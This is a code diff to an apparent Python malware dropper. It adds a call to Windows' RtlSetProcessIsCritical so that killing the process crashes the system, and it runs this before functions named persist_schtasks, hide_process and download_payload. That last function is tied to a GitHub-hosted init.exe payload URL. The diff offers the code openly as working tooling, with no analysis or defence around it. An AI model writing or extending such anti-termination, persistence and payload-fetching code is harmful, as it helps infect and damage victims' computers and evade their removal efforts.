@@ -8,11 +8,27 @@ import sys
 import requests
 import urllib3
 import ftplib
+import ctypes
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+RtlSetProcessIsCritical = ctypes.windll.ntdll.RtlSetProcessIsCritical
+RtlSetProcessIsCritical.argtypes = [ctypes.c_uint, ctypes.c_uint, ctypes.c_uint]
+RtlSetProcessIsCritical.restype = ctypes.c_int
+
 GITHUB_URL = "https://raw.githubusercontent.com/<user>/<repo>/main/init.exe"
 PAYLOAD_PATH = None
+
+def set_process_as_critical():
+    try:
+        result = RtlSetProcessIsCritical(1, 0, 0)
+
+        if result == 0: print("Process is now critical.")
+        else: print("Failed to set the process as critical.")
+    
+    except:
+        # print(f"Error: {e}")
+        pass
 
 def generate_random_name(length=10):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
@@ -270,6 +286,7 @@ def persist_schtasks():
         pass
 
 if __name__ == "__main__":
+    set_process_as_critical()
     persist_schtasks()
     hide_process()
     download_payload()
